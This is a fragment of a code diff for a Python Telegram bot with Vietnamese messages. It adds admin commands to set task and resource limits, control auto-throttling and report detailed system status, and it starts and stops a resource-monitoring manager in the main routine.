+            sent = bot.reply_to(message, f"✅ Đã cập nhật giới hạn tác vụ/user: {int(value)}")
+            
+        elif limit_type == 'global_tasks':
+            if value < 5 or value > 50:
+                sent = bot.reply_to(message, "❌ Số tác vụ toàn hệ phải từ 5-50!")
+                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+                return
+            resource_manager.limits.MAX_CONCURRENT_TASKS_GLOBAL = int(value)
+            sent = bot.reply_to(message, f"✅ Đã cập nhật giới hạn tác vụ toàn hệ: {int(value)}")
+            
+        elif limit_type == 'task_duration':
+            if value < 5 or value > 1440:
+                sent = bot.reply_to(message, "❌ Thời gian tác vụ phải từ 5-1440 phút!")
+                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+                return
+            resource_manager.limits.MAX_TASK_DURATION = int(value * 60)
+            sent = bot.reply_to(message, f"✅ Đã cập nhật thời gian tối đa tác vụ: {int(value)} phút")
+            
+        elif limit_type == 'messages_per_min':
+            if value < 5 or value > 100:
+                sent = bot.reply_to(message, "❌ Tin nhắn/phút phải từ 5-100!")
+                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+                return
+            resource_manager.limits.MAX_MESSAGES_PER_MINUTE = int(value)
+            sent = bot.reply_to(message, f"✅ Đã cập nhật giới hạn tin nhắn/phút: {int(value)}")
+            
+        elif limit_type == 'cpu_limit':
+            if value < 50 or value > 95:
+                sent = bot.reply_to(message, "❌ Giới hạn CPU phải từ 50-95%!")
+                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+                return
+            resource_manager.limits.MAX_CPU_PERCENT = value
+            sent = bot.reply_to(message, f"✅ Đã cập nhật giới hạn CPU: {value}%")
+            
+        elif limit_type == 'ram_limit':
+            if value < 50 or value > 95:
+                sent = bot.reply_to(message, "❌ Giới hạn RAM phải từ 50-95%!")
+                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+                return
+            resource_manager.limits.MAX_RAM_PERCENT = value
+            sent = bot.reply_to(message, f"✅ Đã cập nhật giới hạn RAM: {value}%")
+            
+        else:
+            sent = bot.reply_to(message, "❌ Loại giới hạn không hợp lệ!")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+            return
+        
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+        
+    except Exception as e:
+        logger.error(f"/setlimits error: {e}")
+        sent = bot.reply_to(message, "❌ Lỗi khi cập nhật giới hạn.")
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
+@bot.message_handler(commands=['throttle'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@resource_limit
+@log_command
+def cmd_throttle(message):
+    """Quản lý auto-throttling"""
+    try:
+        args = message.text.split()
+        if len(args) < 2:
+            # Hiển thị trạng thái hiện tại
+            status = resource_manager.get_resource_status()
+            throttle_text = (
+                f"⚡ *AUTO-THROTTLING STATUS*\n\n"
+                f"🔄 *Trạng thái:* {'🔴 Đang giảm hiệu suất' if status['throttling_active'] else '🟢 Bình thường'}\n"
+                f"📊 *Hiệu suất:* {status['performance_percent']}%\n"
+                f"🔧 *Hệ số:* {status['throttle_factor']:.2f}\n\n"
+                f"⚙️ *Cấu hình:*\n"
+                f"• CPU threshold: {resource_manager.limits.CPU_THROTTLE_THRESHOLD}%\n"
+                f"• RAM threshold: {resource_manager.limits.RAM_THROTTLE_THRESHOLD}%\n"
+                f"• Giảm tối thiểu: {resource_manager.limits.THROTTLE_FACTOR_MIN*100:.0f}%\n"
+                f"• Giảm tối đa: {resource_manager.limits.THROTTLE_FACTOR_MAX*100:.0f}%\n"
+                f"• Thời gian phục hồi: {resource_manager.limits.THROTTLE_RECOVERY_TIME//60} phút\n\n"
+                f"📋 *Cách sử dụng:*\n"
+                f"`/throttle on` - Bật auto-throttling\n"
+                f"`/throttle off` - Tắt auto-throttling\n"
+                f"`/throttle recover` - Phục hồi hiệu suất ngay\n"
+                f"`/throttle set <cpu> <ram> <min> <max>` - Cấu hình thresholds"
+            )
+            sent = bot.reply_to(message, throttle_text, parse_mode='Markdown')
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=30)
+            return
+        
+        action = args[1].lower()
+        
+        if action == 'on':
+            resource_manager.is_throttling = True
+            resource_manager.throttle_factor = 0.8  # Giảm 20% hiệu suất
+            sent = bot.reply_to(message, "✅ Đã bật auto-throttling - Hiệu suất giảm 20%")
+            
+        elif action == 'off':
+            resource_manager.recover_performance()
+            sent = bot.reply_to(message, "✅ Đã tắt auto-throttling - Hiệu suất phục hồi 100%")
+            
+        elif action == 'recover':
+            resource_manager.recover_performance()
+            sent = bot.reply_to(message, "✅ Đã phục hồi hiệu suất về 100%")
+            
+        elif action == 'set' and len(args) >= 6:
+            try:
+                cpu_threshold = float(args[2])
+                ram_threshold = float(args[3])
+                min_factor = float(args[4])
+                max_factor = float(args[5])
+                
+                if not (0 < cpu_threshold < 100 and 0 < ram_threshold < 100):
+                    sent = bot.reply_to(message, "❌ CPU và RAM threshold phải từ 1-99%")
+                    auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+                    return
+                
+                if not (0 < min_factor < max_factor < 1):
+                    sent = bot.reply_to(message, "❌ Min factor < Max factor < 1")
+                    auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+                    return
+                
+                resource_manager.limits.CPU_THROTTLE_THRESHOLD = cpu_threshold
+                resource_manager.limits.RAM_THROTTLE_THRESHOLD = ram_threshold
+                resource_manager.limits.THROTTLE_FACTOR_MIN = min_factor
+                resource_manager.limits.THROTTLE_FACTOR_MAX = max_factor
+                
+                sent = bot.reply_to(message, 
+                    f"✅ Đã cập nhật cấu hình throttling:\n"
+                    f"• CPU threshold: {cpu_threshold}%\n"
+                    f"• RAM threshold: {ram_threshold}%\n"
+                    f"• Min factor: {min_factor*100:.0f}%\n"
+                    f"• Max factor: {max_factor*100:.0f}%")
+                    
+            except ValueError:
+                sent = bot.reply_to(message, "❌ Các giá trị phải là số hợp lệ")
+                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+                return
+        else:
+            sent = bot.reply_to(message, "❌ Hành động không hợp lệ. Sử dụng: on, off, recover, set")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+            return
+        
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+        
+    except Exception as e:
+        logger.error(f"/throttle error: {e}")
+        sent = bot.reply_to(message, "❌ Lỗi khi quản lý throttling.")
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
+@bot.message_handler(commands=['systemstatus'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@resource_limit
+@log_command
+def cmd_systemstatus(message):
+    """Hiển thị trạng thái chi tiết của hệ thống"""
+    try:
+        # Lấy thông tin tài nguyên
+        res_status = resource_manager.get_resource_status()
+        
+        # Lấy thông tin hệ thống
+        uptime = get_uptime()
+        system_info = get_system_info_text()
+        
+        # Đếm tác vụ theo loại
+        task_types = {}
+        for (uid, cid, task_key), proc in running_tasks.items():
+            if proc and proc.poll() is None:
+                task_types[task_key] = task_types.get(task_key, 0) + 1
+        
+        # Tạo báo cáo chi tiết
+        status_text = (
+            f"🔧 *TRẠNG THÁI HỆ THỐNG CHI TIẾT*\n\n"
+            f"⏰ *Thời gian:*\n"
+            f"• Uptime: {uptime}\n"
+            f"• Thời gian hiện tại: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}\n\n"
+            f"🖥️ *Tài nguyên:*\n{system_info}\n\n"
+            f"📊 *Quản lý tác vụ:*\n"
+            f"• Tác vụ toàn hệ: {res_status['global_tasks']}/{res_status['max_global_tasks']}\n"
+            f"• Tác vụ của bạn: {res_status['user_tasks'].get(message.from_user.id, 0)}/{res_status['max_user_tasks']}\n"
+            f"• Tác vụ active: {res_status['active_tasks']}\n\n"
+            f"🔄 *Phân loại tác vụ:*\n"
+        )
+        
+        if task_types:
+            for task_type, count in task_types.items():
+                status_text += f"• {task_type}: {count}\n"
+        else:
+            status_text += "• Không có tác vụ nào đang chạy\n"
+        
+        status_text += (
+            f"\n⚙️ *Cấu hình giới hạn:*\n"
+            f"• Tác vụ/user: {res_status['max_user_tasks']}\n"
+            f"• Tác vụ toàn hệ: {res_status['max_global_tasks']}\n"
+            f"• Thời gian tối đa: {resource_manager.limits.MAX_TASK_DURATION//60} phút\n"
+            f"• Tin nhắn/phút: {resource_manager.limits.MAX_MESSAGES_PER_MINUTE}\n"
+            f"• CPU tối đa: {resource_manager.limits.MAX_CPU_PERCENT}%\n"
+            f"• RAM tối đa: {resource_manager.limits.MAX_RAM_PERCENT}%\n\n"
+            f"💚 *Trạng thái:* Hệ thống hoạt động ổn định"
+        )
+        
+        sent = bot.reply_to(message, status_text, parse_mode='Markdown')
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=45)
+        
+    except Exception as e:
+        logger.error(f"/systemstatus error: {e}")
+        sent = bot.reply_to(message, "❌ Lỗi khi lấy trạng thái hệ thống.")
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
 @bot.message_handler(commands=['autonotify'])
 @ignore_old_messages
 @not_banned
@@ -2104,6 +2865,13 @@ def main():
         logger.error(f"❌ Invalid bot token or connection failed: {e}")
         sys.exit(1)
     
+    # Khởi động hệ thống quản lý tài nguyên
+    try:
+        resource_manager.start_monitoring()
+        logger.info("🔧 Hệ thống quản lý tài nguyên đã được khởi động")
+    except Exception as e:
+        logger.error(f"❌ Không thể khởi động hệ thống quản lý tài nguyên: {e}")
+    
     # Khởi động hệ thống thông báo tự động
     try:
         start_auto_notification()
@@ -2149,6 +2917,10 @@ if __name__ == '__main__':
     finally:
         # Cleanup
         try:
+            # Dừng hệ thống quản lý tài nguyên
+            resource_manager.stop_monitoring()
+            logger.info("🔧 Resource management system stopped")
+            
             # Dừng hệ thống thông báo tự động
             stop_auto_notification()
             logger.info("🔔 Auto notification system stopped")
